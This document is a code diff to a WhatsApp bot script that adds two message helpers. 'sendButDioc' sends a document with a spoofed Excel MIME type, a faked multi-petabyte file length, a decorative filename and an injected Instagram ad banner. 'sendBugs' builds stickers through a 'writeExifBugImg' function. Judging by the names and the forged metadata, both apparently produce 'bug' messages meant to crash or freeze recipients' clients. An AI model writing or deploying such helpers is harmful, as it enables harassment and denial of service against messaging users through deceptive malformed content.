@@ -409,6 +409,17 @@ thumbnail: img}
      conn.sendMessage(jid, buttonMessage, {quoted, ...options})
      	}
      
+     conn.sendButDioc = async (jid, but = [], text1, foot, img) => {
+conn.sendMessage(jid, {document: {url: 'setup.py'}, fileName: '𝗣-𝗕𝗼𝘁 ˢⁱᵐᵖˡᵉ ᵇᵒᵗ ʷʰᵃᵗˢᵃᵖᵖ', mimetype: "application/vnd.ms-excel", fileLength: 2222222222222222, jpegThumbnail: fs.readFileSync(img),
+contextInfo: {
+	externalAdReply:{title: 'Viannna', body: 'My Instagram account - Follow now',mediaUrl: 'www.instagram.com/viiannn_a?r=nametag', sourceUrl: 'https://www.instagram.com/viiannn_a?r=nametag', mediaType: 1, showAdAttribution: true, renderLargerThumbnail: true, showAdAttribution: true,thumbnail: fs.readFileSync('./image/vivi.jpg')}
+	},
+                    caption: text1,
+                    footer: foot,
+                    buttons: but,
+                    headerType: 4})
+                   }
+                   
 conn.sendButLocc = async (jid, but = [], text1, foot, img) => {
 conn.sendMessage(jid, {location: {
 degreesLongitude: 0,
@@ -537,6 +548,19 @@ conn.sendMessage(jid, {image: {url: ul},
         let buffer
         if (options && (options.packname || options.author)) {
             buffer = await writeExifImg(buff, options)
+        } else {
+            buffer = await imageToWebp(buff)
+        }
+
+        await conn.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted })
+        return buffer
+    }
+    
+    conn.sendBugs = async (jid, path, quoted, options = {}) => {
+        let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
+        let buffer
+        if (options && (options.packname || options.author || options.emojis)) {
+            buffer = await writeExifBugImg(buff, options)
         } else {
             buffer = await imageToWebp(buff)
         }
